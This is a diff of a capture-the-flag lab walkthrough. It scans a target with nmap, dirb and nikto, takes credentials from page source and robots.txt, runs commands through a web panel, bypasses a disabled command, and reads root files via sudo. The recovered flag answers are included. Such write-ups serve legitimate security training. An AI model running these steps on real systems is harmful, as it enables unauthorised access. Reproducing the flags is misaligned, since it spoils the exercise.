@@ -1,4 +1,9 @@
-#ping the target
+Difficulty: EASY
+
+Keywords and tools: nmap, nikto, dirb, directory traversal
+
+
+#ping the target (target IP will be given after you've joined the room)
 
 ping 10.10.102.120 
 PING 10.10.102.120 (10.10.102.120) 56(84) bytes of data.
@@ -21,6 +26,7 @@ PORT   STATE SERVICE VERSION
 |_http-server-header: Apache/2.4.18 (Ubuntu)
 |_http-title: Rick is sup4r cool
 
+
 #connect to web app with Firefox
 #inspect the page source 
 
@@ -32,12 +38,13 @@ PORT   STATE SERVICE VERSION
 
 -->
 
-#Check /robots.txt
 
+#Check /robots.txt
 Wubbalubbadubdub
 
 #Maybe a password?
 #Let's try ssh.
+
 
 ssh R1ckRul3s@10.10.102.120
 R1ckRul3s@10.10.102.120: Permission denied (publickey).
@@ -47,22 +54,18 @@ R1ckRul3s@10.10.102.120: Permission denied (publickey).
   
 
 #scan the target for possibly hidden content with dirb
-
 dirb http://10.10.102.120/
 
 #nothing special found, lets try nikto
-
 nikto -h 10.10.102.120
 
-#nikto found an /login.php page, lets see it
+#nikto found an /login.php page, lets see it and try to login
 
 username: R1ckRul3s
 password: Wubbalubbadubdub
 
 #we get a command panel with a command execution box, lets try typing 'whoami'
-
 www-data
-
 ls
 
 Sup3rS3cretPickl3Ingred.txt
@@ -75,11 +78,9 @@ portal.php
 robots.txt
 
 cat Sup3rS3cretPickl3Ingred.txt
-
 Command disabled
 
 #open the page with Firefox: http://10.10.102.120/Sup3rS3cretPickl3Ingred.txt
-
 mr. meeseek hair
 
 #and we have our first flag
@@ -89,25 +90,24 @@ mr. meeseek hair
 Look around the file system for the other ingredient.
 
 #lets try directory traversal
-
 cd ../../../../; ls
 
 #works, lets explore home
 
 cd /home; ls
-  
 cd /home/rick; ls
 
 #we see 'second ingredients', and since cat-command is disabled, lets try 'less'
 
 less /home/rick/"second ingredients"
-
 jerry tear
+
+#now we got our second flag
+
 
 #lets see if we have sudo
 
 sudo ls /root;
-
 sudo less /root/3rd.txt
 
 3rd ingredients: fleeb juice
